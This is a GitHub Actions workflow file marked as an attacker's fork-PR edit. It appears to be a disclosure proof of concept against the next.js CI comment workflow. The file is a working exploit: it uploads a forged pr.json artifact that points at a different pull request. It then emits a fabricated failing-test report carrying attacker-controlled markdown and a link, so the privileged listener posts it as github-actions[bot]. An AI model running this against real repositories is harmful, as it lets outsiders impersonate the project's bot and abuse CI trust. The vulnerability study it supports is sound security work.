# ATTACKER FILE -- the fork PR's edit of the harness. Derived from harness/build_and_test.yml
# `build-and-test` workflow. The only parts that matter to this PoC are
# reproduced verbatim from vercel/next.js@5da8ef12 .github/workflows/build_and_test.yml:
#   * the workflow `name:` (pr_ci_comment.yml listens on `workflows: ['build-and-test']`)
#   * the `pr-ci-metadata` job, which writes pr.json and uploads it as the
#     `pr-ci-metadata` artifact
# The `test` job stands in for next.js's real test matrix: it emits one
# `--test output start-- ... --test output end--` block in the shape
# scripts/pr-ci-comment.mjs parses, then fails, so the listener posts a real
# failing-test report. The victim canary lives in that block.
name: build-and-test

on: pull_request

permissions:
  contents: read

jobs:
  pr-ci-metadata:
    name: Upload PR CI metadata
    if: ${{ github.event_name == 'pull_request' }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Write PR metadata
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
          PR_HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
          PR_IS_FORK: ${{ github.event.pull_request.head.repo.full_name != github.repository }}
        run: |
          mkdir -p pr-ci-metadata
          node <<'NODE'
          const fs = require('fs')

          fs.writeFileSync(
            'pr-ci-metadata/pr.json',
            JSON.stringify(
              {
                number: 1,
                headSha: '72afe21b4a1bdadc1603ace64c294ede856b8622',
                headRef: process.env.PR_HEAD_REF,
                headRepo: process.env.PR_HEAD_REPO,
                baseRef: process.env.PR_BASE_REF,
                isFork: process.env.PR_IS_FORK === 'true',
              },
              null,
              2
            )
          )
          NODE

      - name: Upload PR metadata
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: pr-ci-metadata
          path: pr-ci-metadata/pr.json
          retention-days: 1

  test:
    name: test (harness stand-in for the next.js test matrix)
    runs-on: ubuntu-latest
    steps:
      - name: Emit a failing suite and fail
        run: |
          cat <<'BLOCK'
          --test output start-- {
            "numFailedTests": 1,
            "processEnv": { "NEXT_TEST_MODE": "dev" },
            "testResults": [
              {
                "name": "test/e2e/harness/forged.test.ts",
                "status": "failed",
                "message": "POC-21331491b581 **ATTACKER-CONTROLLED MARKDOWN** posted as github-actions[bot] on a pull request the author has no write access to. [arbitrary link](https://example.invalid/poc-21331491b581)",
                "assertionResults": [
                  { "status": "failed", "ancestorTitles": ["POC-21331491b581 forged suite"], "title": "forged case" }
                ]
              }
            ]
          } --test output end--
          BLOCK
          exit 1
